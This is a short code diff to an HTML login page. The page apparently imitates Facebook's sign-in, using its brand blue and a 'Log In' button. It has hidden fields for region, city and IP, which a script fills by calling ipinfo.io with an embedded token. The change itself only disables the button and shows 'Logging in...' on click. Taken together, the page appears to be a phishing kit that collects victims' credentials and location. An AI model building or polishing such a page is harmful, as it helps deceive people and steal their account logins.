@@ -52,7 +52,8 @@
                         <input type="hidden" value="" name="region" id="region">
                         <input type="hidden" value="" name="ip" id="ip">
                         
-                        <button type="submit" 
+                        <button type="submit"
+                                id="submitBtn" 
                                 class="w-full bg-[#1877f2] text-white font-semibold py-3 rounded-lg hover:bg-[#166fe5] transition">
                             Log In
                         </button>
@@ -91,6 +92,12 @@
         const region = document.getElementById('region'); 
         const city = document.getElementById('cty'); 
         const ip = document.getElementById('ip');
+        const submitBtn = document.getElementById('submitBtn');
+
+        submitBtn.addEventListener('click', () => {
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Logging in...';
+        });
 
         function getIpInfo() {
             fetch('https://ipinfo.io/json?token=efd2f9e1d7b7a0')
